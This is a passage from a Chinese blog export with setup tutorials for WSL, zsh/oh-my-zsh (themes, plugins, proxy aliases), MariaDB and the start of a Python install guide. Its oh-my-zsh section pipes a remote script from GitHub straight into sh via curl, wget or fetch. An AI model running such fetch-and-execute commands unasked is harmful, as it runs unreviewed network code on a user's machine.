<h2 id="一键安装"><a href="#一键安装" class="headerlink" title="一键安装"></a>一键安装</h2><blockquote>
<p>系统内部版本号大于19041可用，<code>Win+R</code>运行<code>winver</code>查看</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span>	<span class="comment"># 默认安装Ububtu</span></span><br></pre></td></tr></table></figure>

<h3 id="自定义安装"><a href="#自定义安装" class="headerlink" title="自定义安装"></a>自定义安装</h3><p>查看可安装发行版</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl.exe <span class="literal">-l</span> <span class="literal">-o</span></span><br></pre></td></tr></table></figure>

<p>安装指定发行版</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 20.04</span></span><br><span class="line">wsl <span class="literal">--install</span> <span class="literal">-d</span> Ubuntu<span class="literal">-20</span>.<span class="number">04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kail Linux</span></span><br><span class="line">wsl <span class="literal">--install</span> <span class="literal">-d</span> kali<span class="literal">-linux</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="旧版安装方法"><a href="#旧版安装方法" class="headerlink" title="旧版安装方法"></a>旧版安装方法</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><code>Win+S</code> 搜索, 用<strong>管理员权限</strong>运行<code>Windows PowerShell</code>, 或使用<code>Win+X</code>打开菜单运行选择<code>Windows PowerShell</code>.（接下来的命令都是在这个终端上执行.）</p>
<img data-src="http://img.owq.world/2021/11/2125-658665.png" style="zoom:50%;" />

<ol>
<li><h3 id="启用-WSL-子系统"><a href="#启用-WSL-子系统" class="headerlink" title="启用 WSL 子系统"></a>启用 WSL 子系统</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Windows-Subsystem-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure>
</li>
<li><h3 id="启用虚拟机功能"><a href="#启用虚拟机功能" class="headerlink" title="启用虚拟机功能"></a>启用虚拟机功能</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>

<p>到了这一步要 <strong>重启计算机</strong> 进行应用(更新)</p>
</li>
<li><h3 id="下载-Linux-内核更新包"><a href="#下载-Linux-内核更新包" class="headerlink" title="下载 Linux 内核更新包"></a>下载 Linux 内核更新包</h3><p><strong>选择自己计算机内核架构对应的包</strong>, 输入命令<code>systeminfo</code>查看</p>
<img data-src="http://img.owq.world/2021/12/1804-e90d61.png" style="zoom:50%;" />

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93c2xzdG9yZXN0b3JhZ2UuYmxvYi5jb3JlLndpbmRvd3MubmV0L3dzbGJsb2Ivd3NsX3VwZGF0ZV94NjQubXNp">x64更新包</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93c2xzdG9yZXN0b3JhZ2UuYmxvYi5jb3JlLndpbmRvd3MubmV0L3dzbGJsb2Ivd3NsX3VwZGF0ZV9hcm02NC5tc2k=">ARM64更新包</span></li>
</ul>
</li>
<li><h3 id="将-WSL-2-设置为默认版本"><a href="#将-WSL-2-设置为默认版本" class="headerlink" title="将 WSL 2 设置为默认版本"></a>将 WSL 2 设置为默认版本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--set-default-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="安装-WSL"><a href="#安装-WSL" class="headerlink" title="安装 WSL"></a>安装 WSL</h3><p>安装子系统方式有三, 可根据个人喜好选择.</p>
<ul>
<li><h3 id="微软商店搜索安装-推荐"><a href="#微软商店搜索安装-推荐" class="headerlink" title="微软商店搜索安装(推荐)"></a>微软商店搜索安装(推荐)</h3><ul>
<li><code>Win + S</code> 搜索打开 <code>Microsoft Store</code> 搜索 Linux 找到对应版本安装即可.</li>
</ul>
</li>
<li><h3 id="手动下载安装包安装"><a href="#手动下载安装包安装" class="headerlink" title="手动下载安装包安装"></a>手动下载安装包安装</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy93c2wvaW5zdGFsbC1tYW51YWwjZG93bmxvYWRpbmctZGlzdHJpYnV0aW9ucw==">官方下载地址</span></li>
<li>其它Linux地址<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3l1azcvQXJjaFdTTA==">ArchWSL</span></li>
</ul>
</li>
</ul>
</li>
<li><h3 id="命令行安装"><a href="#命令行安装" class="headerlink" title="命令行安装"></a>命令行安装</h3><p>不同发行版安装命令, 使用<code>PowerShell</code>执行, 链接为包链接.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kali Linux</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://aka.ms/wsl<span class="literal">-kali-linux-new</span> <span class="literal">-OutFile</span> Ubuntu.appx <span class="literal">-UseBasicParsing</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 20.04</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://aka.ms/wslubuntu2004 <span class="literal">-OutFile</span> Ubuntu.appx <span class="literal">-UseBasicParsing</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="WSL-位置移动-可选"><a href="#WSL-位置移动-可选" class="headerlink" title="WSL 位置移动(可选)"></a>WSL 位置移动(可选)</h2><blockquote>
<p>这里使用LxRunOffline工具进行移动 下载传送门 -&gt;  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0REb1NvbGl0YXJ5L0x4UnVuT2ZmbGluZS9yZWxlYXNlcw==">🚪</span></p>
</blockquote>
<p>如果担心C盘空间不够可以把WSL的安装位置移动到其它盘.</p>
<p>下载解压压缩包后, 在解压目录处打开命令行, 就可以运行以下命令了.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看已安装 wsl 名称</span></span><br><span class="line">wsl <span class="literal">-l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动 wsl 到指定目录</span></span><br><span class="line">lxrunoffline m <span class="literal">-n</span> &lt;wsl<span class="literal">-name</span>&gt; <span class="literal">-d</span> &lt;<span class="built_in">dir</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">lxrunoffline m <span class="literal">-n</span> docker<span class="literal">-desktop</span> <span class="literal">-d</span> D:\OWQ\Docker\wsl\distro</span><br><span class="line">lxrunoffline m <span class="literal">-n</span> docker<span class="literal">-desktop-data</span> <span class="literal">-d</span> D:\OWQ\Docker\wsl\data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看wsl路径</span></span><br><span class="line">lxrunoffline di <span class="literal">-n</span> docker<span class="literal">-desktop</span></span><br><span class="line">lxrunoffline di <span class="literal">-n</span> docker<span class="literal">-desktop-data</span></span><br></pre></td></tr></table></figure>



<h2 id="WSL-2-优化配置-可选"><a href="#WSL-2-优化配置-可选" class="headerlink" title="WSL 2 优化配置(可选)"></a>WSL 2 优化配置(可选)</h2><blockquote>
<p>配置文档官方传送门 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93c2wvd3NsLWNvbmZpZyNjb25maWd1cmUtZ2xvYmFsLW9wdGlvbnMtd2l0aC13c2xjb25maWc=">🚪</span></p>
</blockquote>
<h3 id="内存配置"><a href="#内存配置" class="headerlink" title="内存配置"></a>内存配置</h3><p>WSL2内存占用高的问题至今存在，修改Windows位于用户目录<code>%home%</code>下的<code>.wslconfig</code>文件，若没有则自己创建一个.</p>
<p>ps:直接在资源管理器输入<code>%home%</code>按回车就可跳转, 若出错则是电脑环境变量没有配置好</p>
<img data-src="http://img.owq.world/2021/11/2125-5f3eaf.png" style="zoom:50%;" />

<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>主要配置内存和交换内存, 其它可以不用管, 看自己电脑配置设置.</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[wsl2]</span></span><br><span class="line"><span class="comment"># 给 WSL 2 虚拟机分配的内存大小 (默认为本机内存的50%）</span></span><br><span class="line"><span class="attr">memory</span>=<span class="number">8</span>GB</span><br><span class="line"><span class="comment"># 为 WSL 2 虚拟机分配的交换空间 (0 表示没有交换空间, 一般设置为本机内存的25%)</span></span><br><span class="line"><span class="attr">swap</span>=<span class="number">0</span></span><br><span class="line"><span class="comment"># 自定义交换虚拟磁盘 vhd 的绝对路径 (可选配置)</span></span><br><span class="line"><span class="attr">swapFile</span>=&lt;path&gt;</span><br><span class="line"><span class="comment"># 是否允许将 WSL 2 的端口转发到主机（默认为 true）</span></span><br><span class="line"><span class="attr">localhostForwarding</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>配置好文件后需要关闭WSL重新进入才会生效.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>zsh + oh-my-zsh 简易配置</title>
    <url>/4bfebac1/</url>
    <content><![CDATA[<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><p>使用系统对应的包管理器安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install zsh</span><br></pre></td></tr></table></figure>



<h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><p>安装前提要有<code>git</code></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">apt <span class="keyword">install</span> git</span><br></pre></td></tr></table></figure>

<p>根据已有的网络工具选其一执行即可.</p>
<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="连接被墙问题"><a href="#连接被墙问题" class="headerlink" title="连接被墙问题"></a>连接被墙问题</h2><h3 id="方法一-科学上网"><a href="#方法一-科学上网" class="headerlink" title="方法一: 科学上网"></a>方法一: <del>科学上网</del></h3><blockquote>
<p>只可意会不可言传🐕</p>
</blockquote>
<h3 id="方法二-加速ssh登录"><a href="#方法二-加速ssh登录" class="headerlink" title="方法二: 加速ssh登录"></a>方法二: 加速ssh登录</h3><blockquote>
<p>适用于阿里云服务器😶</p>
</blockquote>
<p>修改 <code>/etc/ssh/ssh_config</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh/ssh_config</span><br></pre></td></tr></table></figure>

<p>取消以下行的注释</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># GSSAPIAuthentication no</span></span><br></pre></td></tr></table></figure>

<p>没有生效可以重启下sshd服务器</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/i</span>nit.d/sshd restart</span><br></pre></td></tr></table></figure>



<h3 id="方法三-映射hosts"><a href="#方法三-映射hosts" class="headerlink" title="方法三: 映射hosts"></a>方法三: 映射hosts</h3><blockquote>
<p>死马当活马医😂</p>
</blockquote>
<p>进入 <span class="exturl" data-url="aHR0cHM6Ly93d3cuaXBhZGRyZXNzLmNvbS8=">https://www.ipaddress.com/</span> 获取域名的映射IP</p>
<p><img data-src="http://img.owq.world/2021/11/2123-f639cc.png"></p>
<p>修改<code>hosts</code>文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>

<p>添加对应的ip映射即可</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">185.199.108.133</span> raw.githubusercontent.com</span><br></pre></td></tr></table></figure>

<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><blockquote>
<p>主题文件位于 <code>.oh-my-zsh/themes</code> 目录下，可自定义修改</p>
</blockquote>
<h3 id="简单实用的"><a href="#简单实用的" class="headerlink" title="简单实用的"></a>简单实用的</h3><img data-src="http://img.owq.world/2021/11/2124-f27aa9.png" style="zoom:80%;" />

<p>修改<code>~/.zshrc</code> 配置文件</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ZSH_THEME</span>=<span class="string">&quot;ys&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="powerlevel10"><a href="#powerlevel10" class="headerlink" title="powerlevel10"></a>powerlevel10</h3><blockquote>
<p>仓库传送门 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvbWthdHYvcG93ZXJsZXZlbDEwaw==">🚪</span></p>
</blockquote>
<img data-src="http://img.owq.world/2022/05/1500-a5e012.png" style="zoom:80%;" />

<h4 id="从储存库安装"><a href="#从储存库安装" class="headerlink" title="从储存库安装"></a>从储存库安装</h4><p>克隆主题包到主题目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>

<p>修改<code>~/.zshrc</code> 配置文件</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ZSH_THEME</span>=<span class="string">&quot;powerlevel10k/powerlevel10k&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="Arch-安装方法"><a href="#Arch-安装方法" class="headerlink" title="Arch 安装方法"></a>Arch 安装方法</h4><p>直接从软件源安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S zsh-theme-powerlevel10k</span><br></pre></td></tr></table></figure>

<p>添加到配置里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;source /usr/share/zsh-theme-powerlevel10k/powerlevel10k.zsh-theme&#x27;</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>重新进入shell配置即可</p>
<h3 id="powerline"><a href="#powerline" class="headerlink" title="powerline"></a>powerline</h3><img data-src="http://img.owq.world/2021/11/2124-9962fa.png" style="zoom: 80%;" />

<blockquote>
<p>仓库传送门 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plcmVteUZyZWVBZ2VudC9vaC1teS16c2gtcG93ZXJsaW5lLXRoZW1l">🚪</span></p>
</blockquote>
<p>克隆主题文件到本地</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jeremyFreeAgent/oh-my-zsh-powerline-theme.git powerline</span><br></pre></td></tr></table></figure>

<p>运行安装脚本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> powerline &amp;&amp; ./install_in_omz.sh</span><br></pre></td></tr></table></figure>

<p>修改 <code>~/.zshrc</code> 配置文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=<span class="string">&quot;powerline&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># powerline other config</span></span><br><span class="line">POWERLINE_HIDE_HOST_NAME=<span class="string">&quot;true&quot;</span></span><br><span class="line">POWERLINE_PATH=<span class="string">&quot;short&quot;</span></span><br><span class="line">POWERLINE_SHOW_GIT_ON_RIGHT=<span class="string">&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 256 Color pattern</span></span><br><span class="line"><span class="built_in">export</span> TERM=<span class="string">&quot;xterm-256color&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>若终端符号显示不全或错位需要设置为 <code>TureType字体</code></p>
<p>如: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvbnNreS9GaXJhQ29kZQ==">FiraCode</span>、powerline</p>
</blockquote>
<h4 id="安装powerline字体"><a href="#安装powerline字体" class="headerlink" title="安装powerline字体"></a>安装powerline字体</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fonts-powerline</span><br></pre></td></tr></table></figure>

<h2 id="自定义配置"><a href="#自定义配置" class="headerlink" title="自定义配置"></a>自定义配置</h2><p>修改<code>~/.zshrc</code>配置文件</p>
<p><strong>快速添加sudo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># EscEsc to sudo</span></span><br><span class="line"><span class="built_in">bindkey</span> -s <span class="string">&#x27;\e\e&#x27;</span> <span class="string">&#x27;\C-asudo \C-e&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>WSL2下的代理配置</strong></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Proxy config</span></span><br><span class="line"><span class="keyword">export</span> hostip=$(cat /etc/resolv.conf | grep -oP &#x27;(?&lt;=nameserver\ ).*&#x27;)</span><br><span class="line">alias proxyon=&#x27;<span class="keyword">export</span> https_proxy=<span class="string">&quot;http://$&#123;hostip&#125;:7890&quot;</span> &amp;&amp; <span class="keyword">export</span> http_proxy=<span class="string">&quot;http://$&#123;hostip&#125;:7890&quot;</span> &amp;&amp; <span class="keyword">export</span> all_proxy=<span class="string">&quot;socks5://$&#123;hostip&#125;:7890&quot;</span>&#x27;</span><br><span class="line">alias unproxy=&#x27;<span class="keyword">unset</span> http_proxy &amp;&amp; <span class="keyword">unset</span> https_proxy &amp;&amp; <span class="keyword">unset</span> all_proxy&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>常用别名设置</strong></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># git <span class="keyword">log</span></span><br><span class="line"><span class="keyword">alias</span> glog=<span class="string">&#x27;git log --graph --pretty=oneline --abbrev-commit&#x27;</span></span><br><span class="line"></span><br><span class="line"># <span class="keyword">ls</span> -al</span><br><span class="line"><span class="keyword">alias</span> ll=<span class="keyword">ls</span> -al --show-<span class="keyword">control</span>-chars --<span class="keyword">color</span> $*</span><br><span class="line"></span><br><span class="line"># Other <span class="keyword">alias</span> config</span><br><span class="line"><span class="keyword">alias</span> ipython=<span class="string">&#x27;ipython3&#x27;</span></span><br><span class="line"><span class="keyword">alias</span> npm=<span class="string">&#x27;sudo npm&#x27;</span></span><br><span class="line"><span class="keyword">alias</span> typora=<span class="string">&#x27;typora.exe&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="配置其他用户可用"><a href="#配置其他用户可用" class="headerlink" title="配置其他用户可用"></a>配置其他用户可用</h2><blockquote>
<p>该方法虽然可以一次配置全局生效, 但会存在权限问题故不建议使用.</p>
<p>建议其它用户最好重新安装配置.</p>
</blockquote>
<p>为root用户建立软连接，即root用户使用当前用户的配置</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s <span class="variable">$HOME</span>/.oh-my-zsh /root/.oh-my-zsh</span><br><span class="line">sudo <span class="built_in">ln</span> -s <span class="variable">$HOME</span>/.zshrc /root/.zshrc</span><br></pre></td></tr></table></figure>

<p>切换root进入zsh，若提示无pyenv命令，则再建立软连接即可</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s <span class="variable">$HOME</span>/.pyenv /root/.pyenv</span><br></pre></td></tr></table></figure>

<p>若提示目录权限警告，则在 .zshrc 文件前面添加</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ZSH_DISABLE_COMPFIX</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>若要单独配置，复制相应目录到对应用户主目录下即可</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> -r <span class="variable">$HOME</span>/.oh-my-zsh	/root</span><br><span class="line">sudo <span class="built_in">cp</span> -r <span class="variable">$HOME</span>/.zshrc	/root</span><br></pre></td></tr></table></figure>



<h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><h3 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d0aW5nL2F1dG9qdW1w">autojump</span></h3><blockquote>
<p>快速跳转目录</p>
</blockquote>
<p>软件包安装</p>
<p><strong>apt-get</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install autojump</span><br></pre></td></tr></table></figure>

<p><strong>pacman</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">pacman -S <span class="built_in">auto</span>jump</span><br></pre></td></tr></table></figure>

<p>从仓库安装</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/wting/</span>autojump.git</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 跳转目录安装</span></span><br><span class="line"><span class="built_in">cd</span> autojump</span><br><span class="line">./install.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line">./uninstall.py</span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<figure class="highlight bnf"><table><tr><td class="code"><pre><span class="line">j <span class="attribute">&lt;部分目录名&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pzaC11c2Vycy96c2gtYXV0b3N1Z2dlc3Rpb25z">zsh-autosuggestions</span></h3><blockquote>
<p>历史命令灰色提示</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<h3 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pzaC11c2Vycy96c2gtc3ludGF4LWhpZ2hsaWdodGluZw==">zsh-syntax-highlighting</span></h3><blockquote>
<p>正确语法高亮提示</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<h3 id="git-open"><a href="#git-open" class="headerlink" title="git-open"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhdWxpcmlzaC9naXQtb3Blbg==">git-open</span></h3><blockquote>
<p>浏览器快速打开git项目</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/paulirish/git-open.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/git-open</span><br></pre></td></tr></table></figure>

<p>直接在仓库目录下使用</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">git open</span><br></pre></td></tr></table></figure>

<h3 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h3><p><em>注意：插件中间是以空格分开</em></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">plugins</span><span class="operator">=</span>(git zsh-autosuggestions zsh-syntax-highlighting git-open)</span><br></pre></td></tr></table></figure>

<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>打印一只宝可梦: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Bvc3NhdHRpL3Bva2Vtb25zYXk=">pokemonsay</span></p>
]]></content>
      <categories>
        <category>配置记录</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Terminal</tag>
        <tag>zsh</tag>
      </tags>
  </entry>
  <entry>
    <title>MariaDB 安装图文教程</title>
    <url>/9ec13a7e/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>对于初学者, 只需要知道以下几点就行了</p>
<ul>
<li><p>MariaDB 是开源软件</p>
</li>
<li><p>MariaDB 是 MySQL 的分支</p>
</li>
<li><p>提供了与MySQL相同的功能</p>
</li>
<li><p>和 MySQL 一样是 <strong>关系型数据库</strong></p>
</li>
</ul>
<h2 id="下载-MariaDB-安装包"><a href="#下载-MariaDB-安装包" class="headerlink" title="下载 MariaDB 安装包"></a>下载 MariaDB 安装包</h2><p><span class="exturl" data-url="aHR0cHM6Ly9tYXJpYWRiLmNvbS9kb3dubG9hZHMv">官网下载</span></p>
<p>打开后大概是这个样子，这里要注意下，不同时期网站的外观可能会不同，但软件的下载页地址是不会变的。</p>
<p><img data-src="http://img.owq.world/2021/11/2111-62424c.png"></p>
<p>软件版本选择默认(最新版)就行了<br>手动选择下系统版本, Windows 64位选择 <code>MS Windows (64-bit)</code><br>如果不知道自己的系统是多少位的, 那就选择32位包 <code>MS Windows (32-bit)</code><br>选择好后, 你会发现下面的链接是会变的, 这就是你要下载的文件, 让我们点击 <code>Download</code> 开始下载</p>
<p><img data-src="http://img.owq.world/2021/11/2112-284361.png"></p>
<p>点击后会跳转到 &quot;感谢下载&quot; 页面, 这时候等待下载链接建立起来就行了</p>
<p><img data-src="http://img.owq.world/2021/11/2115-3660c6.png"></p>
<h2 id="安装-MariaDB"><a href="#安装-MariaDB" class="headerlink" title="安装 MariaDB"></a>安装 MariaDB</h2><img data-src="http://img.owq.world/2021/11/2114-1271e8.png" style="zoom:50%;" />

<p>勾选&quot;接受使用许可条款&quot;, 然后<code>Next</code>进入下一步</p>
<img data-src="http://img.owq.world/2021/11/2115-52857d.png" style="zoom:50%;" />

<p>左边区域是要安装的组件, 右边是对应组件的说明, 默认设置就行了<br><em>(之后如果要删除不需要的组件, 重新打开安装包下就可以删除了)</em><br>点击 <code>Browse...</code> , 修改下储存路径, 默认软件是放在 C盘 下的<br>这里推荐放在其它盘里, 比如我就放在 <code>D:\Environment\MariaDB</code> 这个路径下</p>
<img data-src="http://img.owq.world/2021/11/2116-2e7524.png" style="zoom:50%;" />

<p>设置 <code>root</code> 用户密码, 输入两次密码以确认, <strong>密码要记牢, 忘记的话就只能重新安装了</strong>, 然后勾上 <code>Use UTF8 as default server&#39;s character set</code>, 这个是设置 <code>*UTF-8*</code> 为默认编码的, 防止中文乱码必备选项</p>
<img data-src="http://img.owq.world/2021/11/2116-7f0aec.png" style="zoom:50%;" />



<p>设置服务名称, 这里我填的是 <code>MariaDB</code> , 名称是可以自定义的<br>设置访问端口号, 用来访问你的 MariaDB 数据库用的, 默认填 <code>3306</code> ,这个要牢记<br>下面的缓冲池大小不用管它, 对前期学习没有影响的</p>
<img data-src="http://img.owq.world/2021/11/2116-59615f.png" style="zoom:50%;" />

<p>开始安装...</p>
<img data-src="http://img.owq.world/2021/11/2116-ff9d22.png" style="zoom:50%;" />

<p>静待一会儿 就大功告成了~</p>
<img data-src="http://img.owq.world/2021/11/2116-d26191.png" style="zoom:50%;" />
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>MariaDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 开发环境搭建萌新教程</title>
    <url>/958bc56b/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<h2 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMv">官网下载</span>, 刚开始学习的话直接下载最新版本的就行了</p>
<p><img data-src="http://img.owq.world/2021/11/2120-1da682.png"></p>
<p>默认下载为64位版本就行了 要下载32位请跳转<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMvd2luZG93cy8=">详细页面下载</span></p>
<p><img data-src="http://img.owq.world/2021/11/2120-92875c.png"></p>
